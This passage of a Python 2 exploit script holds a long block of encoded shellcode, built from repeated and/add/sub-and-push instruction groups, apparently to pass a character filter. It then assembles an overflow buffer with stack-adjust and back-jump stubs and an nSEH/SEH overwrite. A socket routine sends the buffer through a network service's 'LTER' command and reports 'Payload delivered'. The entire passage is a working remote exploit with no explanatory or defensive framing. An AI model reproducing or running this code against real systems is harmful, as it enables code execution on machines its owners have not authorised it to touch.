shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x30\x63\x71\x22" ## add  eax, 0x22716330
shellcode += "\x05\x20\x62\x71\x21" ## add  eax, 0x21716220
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x17\x12\x57\x45" ## add  eax, 0x45571217
shellcode += "\x05\x16\x12\x57\x45" ## add  eax, 0x45571216
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x62\x61\x57\x36" ## add  eax, 0x36576162
shellcode += "\x05\x51\x62\x46\x26" ## add  eax, 0x26466251
shellcode += "\x05\x62\x41\x45\x24" ## add  eax, 0x24454162
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x47\x76\x37\x36" ## add  eax, 0x36377647
shellcode += "\x05\x46\x66\x26\x35" ## add  eax, 0x35266646
shellcode += "\x05\x45\x54\x25\x34" ## add  eax, 0x34255445
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x52\x66\x66\x67" ## add  eax, 0x67666652
shellcode += "\x05\x41\x55\x55\x56" ## add  eax, 0x56555541
shellcode += "\x05\x42\x34\x44\x65" ## add  eax, 0x65443442
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x03\x35\x71\x77" ## add  eax, 0x77713503
shellcode += "\x05\x04\x25\x70\x77" ## add  eax, 0x77702504
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x31\x27\x67\x23" ## add  eax, 0x23672731
shellcode += "\x05\x30\x26\x67\x22" ## add  eax, 0x22672630
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x45\x17\x65\x66" ## add  eax, 0x66651745
shellcode += "\x05\x44\x26\x64\x55" ## add  eax, 0x55642644
shellcode += "\x05\x34\x15\x44\x46" ## add  eax, 0x46441534
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x25\x26\x33\x11" ## add  eax, 0x11332625
shellcode += "\x05\x15\x25\x43\x10" ## add  eax, 0x10432515
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x75\x27\x76\x41" ## add  eax, 0x41762775
shellcode += "\x05\x64\x16\x66\x32" ## add  eax, 0x32661664
shellcode += "\x05\x54\x25\x54\x31" ## add  eax, 0x31542554
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x53\x53\x14\x20" ## add  eax, 0x20145353
shellcode += "\x05\x42\x53\x04\x20" ## add  eax, 0x20045342
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x64\x33\x61\x67" ## add  eax, 0x67613364
shellcode += "\x05\x63\x23\x51\x56" ## add  eax, 0x56512363
shellcode += "\x05\x43\x22\x61\x35" ## add  eax, 0x35612243
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x11\x42\x51\x33" ## add  eax, 0x33514211
shellcode += "\x05\x01\x41\x41\x23" ## add  eax, 0x23414101
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x33\x11\x02\x33" ## add  eax, 0x33021133
shellcode += "\x05\x22\x01\x01\x22" ## add  eax, 0x22010122
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x65\x61\x31\x21" ## add  eax, 0x21316165
shellcode += "\x05\x64\x50\x21\x10" ## add  eax, 0x10215064
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x60\x45\x73\x21" ## add  eax, 0x21734560
shellcode += "\x05\x50\x44\x72\x10" ## add  eax, 0x10724450
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x65\x33\x31\x23" ## add  eax, 0x23313365
shellcode += "\x05\x55\x24\x21\x12" ## add  eax, 0x12212455
shellcode += "\x50"                 ## push eax


buffer = espAdj3
buffer += shellcode
buffer += "A" * (3468 - len(espAdj3) -len(shellcode))
buffer += espAdj2
buffer += backJump2
buffer += "A" * (3550 - 3468 - len(espAdj2) - len(backJump2))
buffer += nseh
buffer += seh
buffer += espAdj
buffer += backJump1
buffer += "D" * (4000 -len(buffer))

try:
	print "[*] Sending payload to LTER command [*]\r\n"
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host,port))
	s.recv(1024)
	s.send("LTER ." + buffer)
	s.close()
	print "[*] Payload delivered [*]"

except:
	print "[!] Connection failed, check debugger! [!]"